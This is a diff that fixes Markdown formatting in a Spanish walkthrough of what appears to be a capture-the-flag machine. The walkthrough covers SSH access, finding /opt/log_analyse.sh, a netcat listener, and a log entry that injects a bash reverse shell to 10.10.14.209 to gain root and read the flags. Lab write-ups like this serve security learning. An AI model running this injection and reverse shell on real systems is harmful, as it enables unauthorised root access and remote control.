@@ -272,9 +272,9 @@
 
    Ahora probamos el acceso por SSH:
 
-    ```bash
+   ```bash
      ssh miranda-wise@10.10.11.66
-    ´´´
+   ```
 
    <img width="886" height="580" alt="image" src="https://github.com/user-attachments/assets/c62693b5-812c-4d47-879d-fabaf641c73f" />
 
@@ -283,9 +283,9 @@
 
    Podemos observar q tenemos el acceso exitoso con la salida de:
    
-    ```bash
+   ```bash
      -bash-5.0$
-    ´´´
+   ```
 
 ### 16. Busqueda de una posibilidad de posibles vectores de escalada
 
@@ -294,51 +294,51 @@
 
    Buscamos scripts .sh ejecutables:
 
-    ```bash
+   ```bash
     find /opt -type f -name "*.sh" -executable 2>/dev/null
-    ´´´
+   ```
 
    <img width="772" height="35" alt="image" src="https://github.com/user-attachments/assets/feabd045-9bbb-41de-be62-e9715436d9c4" />
 
 
-  Como podemos observar en la imagen no devolvió nada ejecutable, pero entonces hicimos una búsqueda por nombre:
+   Como podemos observar en la imagen no devolvió nada ejecutable, pero entonces hicimos una búsqueda por nombre:
 
-    ```bash
+   ```bash
     find / -type f -name "*log_analyse.sh*" 2>/dev/null
-    ´´´
+   ```
   
-  <img width="606" height="33" alt="image" src="https://github.com/user-attachments/assets/f428ca82-c168-4a25-9702-4fd748cf1f9f" />
+   <img width="606" height="33" alt="image" src="https://github.com/user-attachments/assets/f428ca82-c168-4a25-9702-4fd748cf1f9f" />
 
-  Obtenemos como resultado:
+   Obtenemos como resultado:
 
-    ```bash
+   ```bash
      /opt/log_analyse.sh
-    ´´´
+   ```
 
 
 
 ### 17. Limpiamos el archivo de logs previo
 
    Primero abrimos el listener en Kali en otro terminal:
-     ```bash
+   ```bash
       rlwrap nc -nlvp 1337
-     ´´´
+   ```
    
    Despues eliminamos el log anterior:
     
-    ```bash
+   ```bash
      rm -f /var/www/web/user-management-service/log/application.log
-    ´´´
-  <img width="998" height="21" alt="image" src="https://github.com/user-attachments/assets/49aefc06-67c5-414c-9829-5fb57d127d22" />
+   ```
+   <img width="998" height="21" alt="image" src="https://github.com/user-attachments/assets/49aefc06-67c5-414c-9829-5fb57d127d22" />
 
 
-  Ahora usamos una expresión como esta para forzar la ejecución de un reverse shell en el archivo de logs:
+   Ahora usamos una expresión como esta para forzar la ejecución de un reverse shell en el archivo de logs:
 
-     ```bash
+   ```bash
       echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.14.209/1337 0>&1)]' \ > /var/www/web/user-management-service/log/application.log
-     ´´´
+   ```
 
- <img width="1176" height="18" alt="image" src="https://github.com/user-attachments/assets/a4d655bd-88de-420b-b553-a360603a0845" />
+   <img width="1176" height="18" alt="image" src="https://github.com/user-attachments/assets/a4d655bd-88de-420b-b553-a360603a0845" />
 
 ### 18. Ejecución automática y shell como root
 
@@ -355,18 +355,18 @@
 
    Para hallar el Submit Root Flag usamos:
 
-     ```bash
+   ```bash
       cat /root/root.txt
-     ´´´
+   ```
 
    <img width="308" height="67" alt="image" src="https://github.com/user-attachments/assets/eba0bad5-2736-48d7-92ca-dde9468226cf" />
 
   
    Y para el Submit User Fkag usamos:
 
-     ```bash
+   ```bash
       cat /home/miranda-wise/user.txt
-     ´´´
+   ```
    
    <img width="386" height="70" alt="image" src="https://github.com/user-attachments/assets/c118b8c3-c2c3-44cc-83b0-79bd4aa0fc26" />
 
